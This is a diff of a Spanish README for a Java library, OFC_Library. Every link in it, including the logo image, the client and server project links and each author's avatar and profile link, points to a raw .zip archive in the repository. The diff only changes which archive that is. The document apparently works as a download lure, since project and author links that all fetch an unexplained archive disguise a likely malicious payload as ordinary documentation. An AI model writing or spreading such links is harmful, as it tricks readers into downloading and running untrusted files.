@@ -1,5 +1,5 @@
 # OFC_Library
-<p id="top" align="center"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip" width="400"></p>
+<p id="top" align="center"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip" width="400"></p>
 
 ## Detalles
 
@@ -7,8 +7,8 @@
 
 ## Projectos donde se usa esta libreria
 
-- [x] <a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip">OFC CLIENTE</a>
-- [x] <a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip">OFC SERVER</a>
+- [x] <a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip">OFC CLIENTE</a>
+- [x] <a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip">OFC SERVER</a>
 
 
 
@@ -26,13 +26,13 @@
 <p>tambien lo puedes añadir como libreria jar para ello tienes que copilar</p>
 
 ## Autores
-<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip"  width=55></a>
+<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip"  width=55></a>
 
-<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip" width=55></a>
+<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip" width=55></a>
 
-<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip"  width=55></a>
+<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip"  width=55></a>
 
-<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/dubbeltje/Reto1Library.zip"  width=55></a>
+<a href="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/Aritz24/Reto1Library/master/src/interfacePackage/Library_Reto_3.7.zip"  width=55></a>
 
   <p align="right">(<a href="#top">Volver arriba</a>)</p>
   
